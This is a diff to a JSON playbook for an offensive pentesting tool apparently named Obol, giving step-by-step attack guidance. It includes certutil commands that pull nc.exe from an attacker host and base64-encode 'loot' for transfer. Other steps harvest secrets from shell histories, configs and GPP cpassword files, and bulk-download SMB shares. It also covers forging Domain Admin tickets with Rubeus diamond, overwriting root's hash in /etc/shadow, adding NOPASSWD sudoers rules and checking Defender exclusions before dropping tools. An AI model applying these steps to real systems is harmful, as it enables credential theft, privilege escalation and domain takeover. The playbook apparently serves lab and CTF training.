+      "land": [
+        "Runs id, uname -a, sudo -n -l, SUID search, and getcap remotely over SSH via NetExec."
+      ],
+      "look": [
+        "NOPASSWD sudo rules, non-standard SUID binaries, or file capabilities on interpreters."
+      ],
+      "win": "Identity, kernel version, passwordless sudo rules, SUID binaries, and capabilities print remotely.",
+      "mistakes": [
+        "Expecting sudo -n -l to list rules that require a password; open an interactive SSH session if sudo prompts."
+      ]
     }
   ],
   "sudo-abuse": [
@@ -2052,6 +2280,19 @@
       "win": "A key, a vault, or a backup file is found.",
       "mistakes": [
         "Ignoring a found id_rsa over its permissions; copy it to your box and try it."
+      ]
+    },
+    {
+      "when": "From Kali over SSH when you want to sweep shell histories and web/service configs remotely.",
+      "land": [
+        "Reads accessible .bash_history files and greps /etc, /opt, /var/www, and /srv for password, secret, token, and API key strings."
+      ],
+      "look": [
+        "Cleartext passwords in command history or database/application config files."
+      ],
+      "win": "A cleartext credential or secret string prints from history or configuration files.",
+      "mistakes": [
+        "Stopping at the first 50 matches if the output is noisy; narrow the path to the active webroot or service directory."
       ]
     }
   ],
@@ -4056,6 +4297,47 @@
       ]
     }
   ],
+  "certutil-usage-doctor": [
+    {
+      "when": "Certutil answered with 'Too many arguments' or 'Expected no more than N args', so nothing was fetched.",
+      "land": [
+        "Put the URL first and the output path last, and keep the -f: certutil -urlcache -split -f http://{{lhost}}/nc.exe C:\\Windows\\Temp\\nc.exe."
+      ],
+      "look": [
+        "The download runs and the file lands in the temp path you gave."
+      ],
+      "win": "The file transfers once the arguments are in the right order.",
+      "mistakes": [
+        "Flipping the URL and output path, or dropping -f. Certutil counts the extra token as a stray argument."
+      ]
+    },
+    {
+      "when": "When a raw download is blocked or the file is binary-unsafe over the channel you have.",
+      "land": [
+        "Base64-encode on the source: certutil -encode loot.zip loot.b64, then move the text across."
+      ],
+      "look": [
+        "A .b64 text file appears next to the source file."
+      ],
+      "win": "The file becomes text you can paste or transfer through a limited channel.",
+      "mistakes": [
+        "Adding flags or a third argument. The -encode form takes exactly input then output."
+      ]
+    },
+    {
+      "when": "On the target, once the base64 text has arrived.",
+      "land": [
+        "Decode it back: certutil -decode loot.b64 loot.zip."
+      ],
+      "look": [
+        "The original bytes are reconstructed at the output path."
+      ],
+      "win": "The transferred text becomes the working file again.",
+      "mistakes": [
+        "Swapping the argument order. It is input then output, same as -encode."
+      ]
+    }
+  ],
   "shell-revshell-linux": [
     {
       "when": "The moment you have command execution on a Linux target and a listener waiting.",
@@ -4715,6 +4997,19 @@
       "mistakes": [
         "Expecting speed. DCC2 is deliberately slow, so a big list will not finish."
       ]
+    },
+    {
+      "when": "CPU-only VM or when John is preferred for DCC2 ($DCC2$10240#user#hash).",
+      "land": [
+        "john --format=mscash2 with rockyou or a targeted custom wordlist."
+      ],
+      "look": [
+        "John prints the cracked password alongside the cached domain username."
+      ],
+      "win": "A cached domain credential cracks on CPU.",
+      "mistakes": [
+        "Using --format=mscash (MSCASHv1) instead of --format=mscash2 for modern $DCC2$ hashes."
+      ]
     }
   ],
   "responder-poison": [
@@ -5137,7 +5432,7 @@
     {
       "when": "Right after a Linux foothold, to see if this box bridges to another network.",
       "land": [
-        "Lists the interfaces. A second NIC on a different subnet is a pivot target."
+        "Lists the interfaces remotely over SSH. A second NIC on a different subnet is a pivot target."
       ],
       "look": [
         "A second IP on an internal range (10.x, 172.16-31.x, 192.168.x) you could not reach from Kali."
@@ -5146,13 +5441,39 @@
       "mistakes": [
         "Ignoring a second NIC because the first one is the way you came in."
       ]
+    },
+    {
+      "when": "Inside an interactive Linux shell on the foothold host.",
+      "land": [
+        "Runs ip -br addr and ip addr directly on the target to list all NICs and IPv4/IPv6 addresses."
+      ],
+      "look": [
+        "Any non-loopback interface on an internal subnet (10.x, 172.16-31.x, 192.168.x) or container bridge."
+      ],
+      "win": "All interface addresses print and Obol registers any newly discovered internal subnet.",
+      "mistakes": [
+        "Overlooking docker0, lxcbr0, or tun interfaces that bridge to internal containers or VPNs."
+      ]
+    },
+    {
+      "when": "On minimal containers or legacy Linux hosts where iproute2 (ip) is not installed.",
+      "land": [
+        "Falls back to ifconfig -a or /proc/net/fib_trie to enumerate local interface addresses."
+      ],
+      "look": [
+        "LOCAL host entries in /proc/net/fib_trie or inet lines in ifconfig output."
+      ],
+      "win": "Interface IP addresses are recovered even without the ip binary.",
+      "mistakes": [
+        "Giving up when ip: command not found appears in a stripped container."
+      ]
     }
   ],
   "local-linux-routes": [
     {
       "when": "To see which networks this box can reach.",
       "land": [
-        "Prints the routing table. Routes to internal CIDRs are networks you can pivot into."
+        "Prints the routing table remotely. Routes to internal CIDRs are networks you can pivot into."
       ],
       "look": [
         "Routes to subnets Kali cannot reach directly."
@@ -5160,6 +5481,32 @@
       "win": "An internal route you can tunnel toward.",
       "mistakes": [
         "Overlooking specific internal routes behind the default route."
+      ]
+    },
+    {
+      "when": "Inside an interactive Linux shell on the foothold host.",
+      "land": [
+        "Displays both the IPv4 and IPv6 kernel routing tables using ip route."
+      ],
+      "look": [
+        "Static or connected routes pointing to internal subnets via a secondary interface."
+      ],
+      "win": "The full routing table prints and reveals reachable internal networks.",
+      "mistakes": [
+        "Checking only IPv4 when an internal management network is routed over IPv6."
+      ]
+    },
+    {
+      "when": "On legacy Linux systems or minimal containers without iproute2.",
+      "land": [
+        "Uses netstat -rn or route -n to print numeric kernel routing tables."
+      ],
+      "look": [
+        "Destination subnets and Gateway addresses outside your primary ingress network."
+      ],
+      "win": "Numeric routing entries print without DNS lookup delays.",
+      "mistakes": [
+        "Omitting -n and waiting on reverse DNS timeouts."
       ]
     }
   ],
@@ -5176,13 +5523,26 @@
       "mistakes": [
         "Scanning the whole subnet when ARP already named the live ones."
       ]
+    },
+    {
+      "when": "Inside an interactive Linux shell on the foothold host.",
+      "land": [
+        "Queries both ip neigh and arp -a on the host to list recently contacted neighbors."
+      ],
+      "look": [
+        "REACHABLE or STALE neighbor IPs on internal interfaces."
+      ],
+      "win": "Live internal host IPs appear immediately with zero active scanning noise.",
+      "mistakes": [
+        "Ignoring STALE entries; STALE still means the host was recently active at that IP."
+      ]
     }
   ],
   "local-linux-dns": [
     {
       "when": "To find the internal resolver, which is often the DC.",
       "land": [
-        "Reads /etc/resolv.conf. The nameserver is often a domain controller."
+        "Reads /etc/resolv.conf remotely. The nameserver is often a domain controller."
       ],
       "look": [
         "An internal DNS server IP, a likely DC and a pivot or enum target."
@@ -5190,6 +5550,19 @@
       "win": "The internal resolver IP, your route to AD DNS enumeration.",
       "mistakes": [
         "Assuming it is a public resolver. Internal boxes point at the DC."
+      ]
+    },
+    {
+      "when": "Inside an interactive Linux shell on the foothold host.",
+      "land": [
+        "Reads both /etc/resolv.conf and /etc/hosts to capture internal nameservers, search domains, and hardcoded hostnames."
+      ],
+      "look": [
+        "nameserver lines, domain/search suffixes, and custom internal host mappings in /etc/hosts."
+      ],
+      "win": "Internal DNS servers and static host mappings print in one shot.",
+      "mistakes": [
+        "Checking only /etc/resolv.conf and missing hardcoded internal hosts in /etc/hosts."
       ]
     }
   ],
@@ -5206,13 +5579,39 @@
       "mistakes": [
         "Missing a disconnected-looking adapter that is actually internal."
       ]
+    },
+    {
+      "when": "Inside an interactive Windows shell (cmd.exe or PowerShell) on the target host.",
+      "land": [
+        "Runs ipconfig /all locally to list every network adapter, IPv4/IPv6 address, DNS suffix, and default gateway."
+      ],
+      "look": [
+        "Secondary Ethernet or vEthernet adapters bound to internal subnets."
+      ],
+      "win": "Full adapter configuration prints and Obol extracts any internal subnet.",
+      "mistakes": [
+        "Running bare ipconfig and missing DNS suffixes and DHCP/DC server IPs shown by /all."
+      ]
+    },
+    {
+      "when": "Inside a Windows shell when you want a clean PowerShell summary of adapters and gateways.",
+      "land": [
+        "Runs Get-NetIPConfiguration to display structured adapter, IP, gateway, and DNS server objects."
+      ],
+      "look": [
+        "IPv4Address, IPv4DefaultGateway, and DNSServer fields on each interface."
+      ],
+      "win": "Structured per-interface IP and gateway summary prints.",
+      "mistakes": [
+        "Forgetting -ep bypass when invoking powershell from cmd.exe."
+      ]
     }
   ],
   "local-windows-routes": [
     {
       "when": "To see reachable networks from a Windows box.",
       "land": [
-        "route print. Internal routes are pivot directions."
+        "route print remotely. Internal routes are pivot directions."
       ],
       "look": [
         "Routes to internal CIDRs Kali cannot reach."
@@ -5221,13 +5620,39 @@
       "mistakes": [
         "Reading only the default route and missing the specific internal ones."
       ]
+    },
+    {
+      "when": "Inside an interactive Windows shell (cmd.exe) on the target host.",
+      "land": [
+        "Runs route print locally to dump the IPv4 and IPv6 routing tables."
+      ],
+      "look": [
+        "Active Routes entries for 10.x.x.x, 172.16-31.x.x, or 192.168.x.x networks."
+      ],
+      "win": "The full Windows routing table prints.",
+      "mistakes": [
+        "Overlooking persistent routes at the bottom of the route print output."
+      ]
+    },
+    {
+      "when": "Inside a Windows shell when you want PowerShell to filter specifically for internal IPv4 routes.",
+      "land": [
+        "Queries Get-NetRoute and filters for RFC1918 destinations or non-zero next hops."
+      ],
+      "look": [
+        "DestinationPrefix and NextHop columns pointing to internal subnets."
+      ],
+      "win": "A concise table of internal IPv4 routes and their interfaces prints.",
+      "mistakes": [
+        "Ignoring routes where NextHop is 0.0.0.0 (on-link connected subnets)."
+      ]
     }
   ],
   "local-windows-neighbors": [
     {
       "when": "To find live neighbors without scanning.",
       "land": [
-        "arp -a lists recently contacted hosts. Each is alive."
+        "arp -a remotely lists recently contacted hosts. Each is alive."
       ],
       "look": [
         "Internal IPs in the ARP cache."
@@ -5236,13 +5661,39 @@
       "mistakes": [
         "Scanning blindly when ARP already lists the live ones."
       ]
+    },
+    {
+      "when": "Inside an interactive Windows shell (cmd.exe) on the target host.",
+      "land": [
+        "Runs arp -a locally to list cached IPv4-to-MAC mappings per interface."
+      ],
+      "look": [
+        "Dynamic unicast IP entries (skip broadcast .255 and multicast 224.x/239.x addresses)."
+      ],
+      "win": "Every interface ARP table prints, revealing live peer hosts.",
+      "mistakes": [
+        "Mistaking multicast (224.0.0.x) or broadcast addresses for live unicast hosts."
+      ]
+    },
+    {
+      "when": "Inside a Windows shell when you want PowerShell to list only active neighbor states.",
+      "land": [
+        "Runs Get-NetNeighbor filtered to exclude Unreachable entries."
+      ],
+      "look": [
+        "Reachable, Stale, or Permanent IPv4 entries and their InterfaceAlias."
+      ],
+      "win": "Filtered table of live IPv4 neighbors prints.",
+      "mistakes": [
+        "Filtering only for State -eq Reachable and missing Stale entries that are still alive."
+      ]
     }
   ],
   "local-windows-listeners": [
     {
       "when": "To find services bound only to localhost on this box.",
       "land": [
-        "netstat -ano shows listeners. A 127.0.0.1-only port is an internal-only service to port-forward."
+        "netstat -ano remotely shows listeners. A 127.0.0.1-only port is an internal-only service to port-forward."
       ],
       "look": [
         "Ports listening on 127.0.0.1 (not 0.0.0.0), reachable only via a forward."
@@ -5250,6 +5701,32 @@
       "win": "A loopback-only service you can forward and attack.",
       "mistakes": [
         "Ignoring 127.0.0.1 listeners because nmap from Kali never saw them."
+      ]
+    },
+    {
+      "when": "Inside an interactive Windows shell (cmd.exe) on the target host.",
+      "land": [
+        "Runs netstat -ano | findstr LISTENING locally to list all listening TCP ports and their owning PIDs."
+      ],
+      "look": [
+        "127.0.0.1:<port> listeners (e.g. internal web admin panels, databases, debug ports) and their PIDs."
+      ],
+      "win": "Listening ports and PIDs print so you can port-forward internal-only services to Kali.",
+      "mistakes": [
+        "Forgetting to map the PID to a process name with tasklist /svc /fi \"PID eq <pid>\"."
+      ]
+    },
+    {
+      "when": "Inside a Windows shell when you want a sorted PowerShell table of listening TCP ports.",
+      "land": [
+        "Uses Get-NetTCPConnection -State Listen sorted by LocalPort."
+      ],
+      "look": [
+        "High or non-standard ports bound to 127.0.0.1 or an internal interface."
+      ],
+      "win": "Sorted table of LocalAddress, LocalPort, and OwningProcess prints.",
+      "mistakes": [
+        "Overlooking ports bound to a secondary internal IP rather than 127.0.0.1."
       ]
     }
   ],
@@ -6657,6 +7134,19 @@
       "mistakes": [
         "Checking only the active session's in-memory history (Get-History) instead of the persistent PSReadLine file on disk."
       ]
+    },
+    {
+      "when": "From Kali over WinRM when you want a one-shot non-interactive triage before opening Evil-WinRM.",
+      "land": [
+        "Runs whoami /all, systeminfo, net localgroup administrators, and cmdkey /list remotely via NetExec."
+      ],
+      "look": [
+        "SeImpersonatePrivilege or SeBackupPrivilege in whoami /all, OS build and hotfixes in systeminfo, and saved entries in cmdkey /list."
+      ],
+      "win": "Token privileges, OS build, local administrators, and saved credentials print in one remote shot.",
+      "mistakes": [
+        "Running this when port 5985 is closed; switch to On-Host Shell if you entered through a reverse shell or SMB/WMI."
+      ]
     }
   ],
   "seimpersonate": [
@@ -7009,6 +7499,19 @@
       "mistakes": [
         "Treating the obfuscated blob as cleartext."
       ]
+    },
+    {
+      "when": "From Kali over WinRM when you want to check Credential Manager, Winlogon autologon keys, and unattend XML files in one remote command.",
+      "land": [
+        "Runs cmdkey /list, queries the Winlogon registry key, and searches C:\\ for unattend/sysprep XML files via NetExec."
+      ],
+      "look": [
+        "Target: lines in cmdkey /list, DefaultPassword in Winlogon, or paths to Unattend.xml / sysprep.xml."
+      ],
+      "win": "Saved credentials, autologon secrets, or answer file paths print remotely.",
+      "mistakes": [
+        "Forgetting to switch to runas /savecred on-host if cmdkey /list shows a saved Administrator entry."
+      ]
     }
   ],
   "windows-old-hives": [
@@ -7278,6 +7781,19 @@
       "win": "You know the AppLocker constraints.",
       "mistakes": [
         "Fighting AppLocker blind instead of reading the policy."
+      ]
+    },
+    {
+      "when": "From Kali over WinRM before dropping binaries or scripts onto the target.",
+      "land": [
+        "Checks PowerShell LanguageMode, Defender real-time protection status, and exclusion paths in one remote command."
+      ],
+      "look": [
+        "FullLanguage vs ConstrainedLanguage, RealTimeProtectionEnabled True/False, and any ExcludedPath folders."
+      ],
+      "win": "Language mode, Defender status, and exclusion folders print remotely before you touch disk.",
+      "mistakes": [
+        "Uploading winPEAS or Rubeus to C:\\Windows\\Temp before checking if a Defender exclusion folder exists."
       ]
     }
   ],
@@ -8308,16 +8824,68 @@
   ],
   "gpp-passwords": [
     {
-      "when": "Look for GPP passwords in SYSVOL.",
+      "when": "First choice when a readable share (such as Replication or SYSVOL) is exposed over a null session.",
+      "land": [
+        "Recursively downloads all readable files from the discovered share into your working directory so you can grep for Group Policy Preferences XML files (Groups.xml, Services.xml, ScheduledTasks.xml)."
+      ],
+      "look": [
+        "Downloaded Groups.xml, Services.xml, ScheduledTasks.xml, or DataSources.xml files containing a cpassword attribute."
+      ],
+      "win": "You pull the GPP XML files locally from the readable share.",
+      "mistakes": [
+        "Relying only on nxc -M gpp_password, which hardcodes SYSVOL and silently skips custom shares like Replication."
+      ]
+    },
+    {
+      "when": "After downloading XML files from SYSVOL or a custom share like Replication with smbclient.",
+      "land": [
+        "Searches every downloaded XML file for the cpassword attribute so Obol can extract and decrypt it."
+      ],
+      "look": [
+        "userName=\"...\" and cpassword=\"...\" inside Groups.xml, Services.xml, or ScheduledTasks.xml."
+      ],
+      "win": "grep locates the exact XML line containing cpassword.",
+      "mistakes": [
+        "Searching only Groups.xml and missing Services.xml or ScheduledTasks.xml."
+      ]
+    },
+    {
+      "when": "Decrypt a cpassword extracted from a GPP XML file.",
+      "land": [
+        "gpp-decrypt decrypts the AES-encrypted cpassword value using Microsoft's publicly disclosed static key."
+      ],
+      "look": [
+        "The cleartext password."
+      ],
+      "win": "The cpassword decrypts into a usable plaintext password.",
+      "mistakes": [
+        "Pasting extra whitespace into the cpassword."
+      ]
+    },
+    {
+      "when": "Once you hold a domain credential and want to recursively pull files from an authenticated share.",
+      "land": [
+        "Recursively downloads all accessible files from the target share using your domain credentials."
+      ],
+      "look": [
+        "Groups.xml or ScheduledTasks.xml downloaded into your local directory."
+      ],
+      "win": "You retrieve GPP XML files from an authenticated share.",
+      "mistakes": [
+        "Forgetting to check custom shares alongside SYSVOL after authenticating."
+      ]
+    },
+    {
+      "when": "When SYSVOL itself is readable over a null session.",
       "land": [
         "nxc spiders SYSVOL for Groups.xml and friends. The cpassword is reversible with a public key."
       ],
       "look": [
         "A cpassword value, which is always decryptable."
       ],
-      "win": "A GPP password is recovered.",
+      "win": "A GPP password is recovered from SYSVOL.",
       "mistakes": [
-        "Thinking the cpassword is safe because it is encrypted."
+        "Running -M gpp_password when SYSVOL is not readable and the GPP XML lives on a custom share like Replication."
       ]
     },
     {
@@ -8334,51 +8902,12 @@
       ]
     },
     {
-      "when": "Manual fallback.",
+      "when": "When you prefer Impacket's dedicated GPP spider and decrypter targeting the discovered share over SMB.",
       "land": [
-        "An anonymous recursive listing of SYSVOL when the module misses a file."
+        "Connects to the specified share, locates every Group Policy Preferences XML file, and decrypts cpassword values."
       ],
       "look": [
-        "Groups.xml or ScheduledTasks.xml by hand."
-      ],
-      "win": "You find the GPP file manually.",
-      "mistakes": [
-        "Giving up when the automated module misses one."
-      ]
-    },
-    {
-      "when": "After downloading XML files from SYSVOL or a custom replication share with smbclient.",
-      "land": [
-        "Searches every downloaded XML file for the cpassword attribute so Obol can extract and decrypt it."
-      ],
-      "look": [
-        "userName=\"...\" and cpassword=\"...\" inside Groups.xml, Services.xml, or ScheduledTasks.xml."
-      ],
-      "win": "grep locates the exact XML line containing cpassword.",
-      "mistakes": [
-        "Searching only Groups.xml and missing Services.xml or ScheduledTasks.xml."
-      ]
-    },
-    {
-      "when": "Decrypt a cpassword by hand.",
-      "land": [
-        "gpp-decrypt the cpassword value."
-      ],
-      "look": [
-        "The cleartext password."
-      ],
-      "win": "The cpassword decrypts.",
-      "mistakes": [
-        "Pasting extra whitespace into the cpassword."
-      ]
-    },
-    {
-      "when": "When you prefer Impacket's dedicated GPP spider and decrypter over SMB.",
-      "land": [
-        "Connects to SYSVOL, locates every Group Policy Preferences XML file, and decrypts cpassword values."
-      ],
-      "look": [
-        "Decrypted username and password pairs printed from SYSVOL XML files."
+        "Decrypted username and password pairs printed from GPP XML files."
       ],
       "win": "impacket-Get-GPPPassword extracts and decrypts the GPP credential.",
       "mistakes": []
@@ -8386,12 +8915,51 @@
   ],
   "smb-share-inventory": [
     {
-      "when": "Inventory readable shares with a null session.",
+      "when": "First choice when a custom readable share (such as Replication or Backups) appears over a null session.",
       "land": [
-        "Spider every readable share over a null session. obol parses the result."
+        "Recursively lists every directory and file on the target share over an anonymous session using smbclient."
       ],
       "look": [
-        "Readable shares with configs or scripts."
+        "Groups.xml, Services.xml, ScheduledTasks.xml, web.config, .ini, or backup archives inside nested directories."
+      ],
+      "win": "The full directory tree of the custom share prints and Obol catalogs discovered files.",
+      "mistakes": [
+        "Relying only on nxc -M gpp_password, which checks SYSVOL by default and skips custom shares like Replication."
+      ]
+    },
+    {
+      "when": "When recursive listing reveals Group Policy Preferences XML files on a custom share over a null session.",
+      "land": [
+        "Disables interactive prompts, enables recursion, and downloads Groups.xml, Services.xml, and ScheduledTasks.xml into your working directory."
+      ],
+      "look": [
+        "getting file lines confirming the XML files were saved locally, then grep them for cpassword."
+      ],
+      "win": "GPP XML files are downloaded to Kali so you can extract and decrypt cpassword.",
+      "mistakes": [
+        "Forgetting prompt OFF before mget, which stalls waiting for interactive y/n confirmation."
+      ]
+    },
+    {
+      "when": "Once you hold a valid username and password and want to recursively list a restricted share.",
+      "land": [
+        "Connects to the share with credentials and runs recurse; ls to print the full file tree."
+      ],
+      "look": [
+        "Configuration files, scripts, backups, or user profile folders that were hidden from null sessions."
+      ],
+      "win": "The authenticated share tree prints and Obol indexes any discovered files.",
+      "mistakes": [
+        "Not re-enumerating shares after capturing your first domain credential."
+      ]
+    },
+    {
+      "when": "Inventory all readable shares automatically over a null session.",
+      "land": [
+        "Spiders every readable share over a null session with spider_plus and writes a JSON inventory to /tmp/nxc_hosted/nxc_spider_plus/."
+      ],
+      "look": [
+        "Readable shares with configs, XML files, or scripts."
       ],
       "win": "A share inventory with null auth.",
       "mistakes": [
@@ -8399,29 +8967,135 @@
       ]
     },
     {
-      "when": "With a credential.",
+      "when": "Inventory all readable shares automatically once you hold a credential.",
       "land": [
         "An authenticated spider reaches far more shares than a null session."
       ],
       "look": [
-        "More readable shares."
+        "More readable shares and sensitive files."
       ],
-      "win": "A fuller inventory.",
+      "win": "A fuller inventory across all authenticated shares.",
       "mistakes": [
         "Forgetting to re-spider after getting a credential."
       ]
     },
     {
-      "when": "Manual recursive listing.",
+      "when": "Manual recursive listing across all shares via smbmap.",
       "land": [
-        "READ ONLY marks accessible shares. obol parses the output."
+        "READ ONLY marks accessible shares. Obol parses the recursive tree into loot.files."
       ],
       "look": [
-        "Accessible shares."
+        "Accessible shares and nested credential-bearing files."
       ],
-      "win": "A manual share list.",
+      "win": "A manual recursive share list.",
       "mistakes": [
         "Overlooking a non-default share name."
+      ]
+    },
+    {
+      "when": "Quick check for GPP passwords specifically inside the standard SYSVOL share.",
+      "land": [
+        "Runs NetExec's gpp_password module against SYSVOL."
+      ],
+      "look": [
+        "Decrypted username and cpassword pairs printed from SYSVOL policies."
+      ],
+      "win": "NetExec prints the decrypted GPP account and password.",
+      "mistakes": [
+        "Assuming no GPP passwords exist when -M gpp_password returns nothing on a host whose XML files live on a custom share like Replication."
+      ]
+    },
+    {
+      "when": "After extracting a raw AES-256 cpassword string from Groups.xml, Services.xml, or ScheduledTasks.xml.",
+      "land": [
+        "Runs gpp-decrypt on the cpassword string using Microsoft's published static AES key."
+      ],
+      "look": [
+        "The decrypted cleartext password printed on stdout."
+      ],
+      "win": "gpp-decrypt prints the cleartext password and Obol pairs it with the discovered username.",
+      "mistakes": [
+        "Including quotes or trailing XML attributes in the cpassword argument."
+      ]
+    }
+  ],
+  "smb-share-browse-download": [
+    {
+      "when": "When a non-default SMB share (such as Replication, Backups, or Department) is readable over an anonymous/null session.",
+      "land": [
+        "Connects anonymously with smbclient -N (or runs prompt OFF; recurse ON; mget * to mirror the entire share locally)."
+      ],
+      "look": [
+        "Downloaded XML policies (Groups.xml), scripts (.ps1, .bat), configuration files (web.config, .env), or backup archives."
+      ],
+      "win": "All readable files from the share are downloaded into your Kali workspace for inspection.",
+      "mistakes": [
+        "Listing only the top-level directory and missing files buried three folders deep under domain policy GUIDs."
+      ]
+    },
+    {
+      "when": "When you hold valid credentials and want to browse a restricted share interactively.",
+      "land": [
+        "Opens an interactive authenticated smbclient session on the target share."
+      ],
+      "look": [
+        "User profile directories, internal IT scripts, or application backups."
+      ],
+      "win": "An interactive smb:\\> prompt opens on the restricted share.",
+      "mistakes": [
+        "Forgetting to run prompt OFF and recurse ON inside smbclient before running mget *."
+      ]
+    },
+    {
+      "when": "When you want to bulk-download an entire anonymous share tree in one non-interactive command.",
+      "land": [
+        "Runs smbclient -N with prompt OFF; recurse ON; mget * to pull every readable file into your current directory."
+      ],
+      "look": [
+        "getting file lines for XML, INI, config, or script files that may hold credentials."
+      ],
+      "win": "The entire anonymous share structure is mirrored locally.",
+      "mistakes": [
+        "Running mget * from a cluttered directory instead of a dedicated loot/ or share subfolder."
+      ]
+    },
+    {
+      "when": "When you want to bulk-download an entire authenticated share tree in one non-interactive command.",
+      "land": [
+        "Runs authenticated smbclient with prompt OFF; recurse ON; mget * to pull all files from the share."
+      ],
+      "look": [
+        "Configuration files, KeePass databases (.kdbx), SSH keys, or PowerShell transcripts."
+      ],
+      "win": "All readable files from the authenticated share are downloaded locally.",
+      "mistakes": [
+        "Running a full recursive mget against C$ or Users instead of targeting the specific custom share or subfolder."
+      ]
+    },
+    {
+      "when": "When you already know the exact path to a file on the share and want to download just that file.",
+      "land": [
+        "Uses smbclient -c 'get <remote_path> <local_path>' to pull a single file directly."
+      ],
+      "look": [
+        "Confirmation that the file was transferred and saved to your local filename."
+      ],
+      "win": "The target file is saved locally without spidering the rest of the share.",
+      "mistakes": [
+        "Leaving unquoted backslashes or spaces in the remote path."
+      ]
+    },
+    {
+      "when": "When you prefer smbmap's one-line --download flag to pull a specific file.",
+      "land": [
+        "Runs smbmap --download '<share>/<remote_path>' to fetch the target file into your working directory."
+      ],
+      "look": [
+        "Confirmation that smbmap downloaded and saved the file locally."
+      ],
+      "win": "smbmap downloads the requested file in one command.",
+      "mistakes": [
+        "Omitting the share name prefix from the --download path."
       ]
     }
   ],
@@ -10450,6 +11124,19 @@
       "mistakes": [
         "Using the RC4 key where AES is expected."
       ]
+    },
+    {
+      "when": "From an on-host Windows session when you hold the krbtgt AES256 key.",
+      "land": [
+        "Rubeus.exe diamond requests a real TGT via /tgtdeleg, modifies the PAC to RID 500 and Domain Admins (512), and injects it into memory (/ptt)."
+      ],
+      "look": [
+        "[+] Ticket successfully imported! in Rubeus output."
+      ],
+      "win": "A modified Diamond TGT is active in the current logon session.",
+      "mistakes": [
+        "Forgetting /ptt or passing the NT hash instead of the AES256 key to /krbkey."
+      ]
     }
   ],
   "ad-acl-abuse": [
@@ -11219,7 +11906,20 @@
   ],
   "auth-account-blocked": [
     {
-      "when": "LOCKOUT.",
+      "when": "LOCKOUT (no credentials yet or checking via null session).",
+      "land": [
+        "Query the domain password and lockout policy anonymously over SMB to inspect the lockout threshold and reset window."
+      ],
+      "look": [
+        "Account Lockout Threshold and Locked Accountael/Observation Window values."
+      ],
+      "win": "You know the lockout window without needing a working login first.",
+      "mistakes": [
+        "Continuing to spray while waiting for the observation window to expire."
+      ]
+    },
+    {
+      "when": "LOCKOUT (with a working domain credential).",
       "land": [
         "Read the lockout policy (threshold and window). Stop spraying and wait out the window."
       ],
@@ -14126,6 +14826,19 @@
       ]
     },
     {
+      "when": "Port 3389 is open or enabled and you have valid domain or local user credentials.",
+      "land": [
+        "Launch an interactive graphical RDP desktop session using xfreerdp."
+      ],
+      "look": [
+        "Full Windows graphical desktop session opens in an xfreerdp window."
+      ],
+      "win": "Interactive RDP desktop session established on the target host.",
+      "mistakes": [
+        "Omitting /cert:ignore when connecting to a self-signed Windows RDP certificate."
+      ]
+    },
+    {
       "when": "WinRM port 5985 is closed but ports 135 and 445 are open with administrative rights.",
       "land": [
         "Connect via WMI and SMB output transport using impacket-wmiexec."
@@ -14165,6 +14878,19 @@
       ]
     },
     {
+      "when": "Ports 3389 (RDP) or 5985 (WinRM) are disabled or blocked by group policy and you hold administrative credentials.",
+      "land": [
+        "Add your user to Remote Desktop Users and Remote Management Users and enable RDP and WinRM remotely over SMB."
+      ],
+      "look": [
+        "[+] Executed command via wmiexec / The command completed successfully / Updated rule(s)."
+      ],
+      "win": "RDP (3389) and WinRM (5985) are enabled on the host and xfreerdp / evil-winrm unlock.",
+      "mistakes": [
+        "Running without administrative rights on the target host."
+      ]
+    },
+    {
       "when": "You have semi-interactive command execution and need a full continuous reverse shell.",
       "land": [
         "Execute PowerShell one-liner to download Nishang Invoke-PowerShellTcp script from Kali."
@@ -14188,6 +14914,336 @@
       "win": "Interactive WinRM shell session established via PKI certificate authentication.",
       "mistakes": [
         "Certificate expired, missing client authentication EKU, or key password unhandled."
+      ]
+    }
+  ],
+  "crack-modular-hash": [
+    {
+      "when": "You extracted a PBKDF2-SHA256, Gitea PBKDF2, or Django/Werkzeug modular hash ($pbkdf2-sha256$, sha256:iterations:salt:hash).",
+      "land": [
+        "Run hashcat with -m 10900 (PBKDF2-HMAC-SHA256) or let hashcat auto-detect the modular format against rockyou.txt."
+      ],
+      "look": [
+        "Hashcat status Cracked and the hash:plaintext line."
+      ],
+      "win": "Modular web or application password hash cracked to plaintext.",
+      "mistakes": [
+        "Leaving incompatible prefix wrappers unformatted when hashcat expects raw $pbkdf2-sha256$ or sha256:iter:salt:hash."
+      ]
+    },
+    {
+      "when": "You have an Argon2 ($argon2id$, $argon2i$), Flask/Werkzeug (pbkdf2:sha256:...), or phpass ($P$B, $H$) hash, or you are on a CPU-only VM.",
+      "land": [
+        "Run John the Ripper with rockyou.txt; John auto-detects Argon2, PBKDF2, and phpass modular hashes cleanly on CPU."
+      ],
+      "look": [
+        "Plaintext password printed next to the hash or shown via john --show hashes.txt."
+      ],
+      "win": "Argon2, Flask, or phpass hash cracked to a reusable plaintext password.",
+      "mistakes": [
+        "Forgetting john --show when the hash was already cracked in the potfile."
+      ]
+    },
+    {
+      "when": "You dumped a WordPress, phpBB3, or Joomla phpass hash ($P$... or $H$...) from a CMS database.",
+      "land": [
+        "Run hashcat -m 400 (phpass) against rockyou.txt."
+      ],
+      "look": [
+        "$P$...:<plaintext> printed in hashcat output."
+      ],
+      "win": "CMS user or administrator password recovered in plaintext.",
+      "mistakes": [
+        "Using -m 0 (raw MD5) instead of -m 400 for salted phpass hashes."
+      ]
+    }
+  ],
+  "writable-etc-shadow-sudoers": [
+    {
+      "when": "/etc/shadow is writable by your user or a group you belong to (such as shadow).",
+      "land": [
+        "Generate a SHA-512 password hash with openssl passwd -6 and replace root's hash field in /etc/shadow, then su - root."
+      ],
+      "look": [
+        "uid=0(root) gid=0(root) after switching to root with the new password."
+      ],
+      "win": "Direct root shell via /etc/shadow hash replacement.",
+      "mistakes": [
+        "Corrupting the colon-delimited fields in /etc/shadow without saving a backup copy first."
+      ]
+    },
+    {
+      "when": "/etc/sudoers or /etc/sudoers.d is writable by your user or group.",
+      "land": [
+        "Append a NOPASSWD:ALL rule for your current username to /etc/sudoers or /etc/sudoers.d/pwn."
+      ],
+      "look": [
+        "Rule written cleanly with valid sudoers syntax."
+      ],
+      "win": "Passwordless sudo granted to your current user.",
+      "mistakes": [
+        "Introducing a syntax error into /etc/sudoers (which breaks sudo system-wide) or leaving world-writable permissions on a /etc/sudoers.d file."
+      ]
+    },
+    {
+      "when": "After adding your NOPASSWD sudoers rule or updating /etc/shadow.",
+      "land": [
+        "Escalate immediately to an interactive root shell with sudo su - and verify with id."
+      ],
+      "look": [
+        "uid=0(root) gid=0(root)."
+      ],
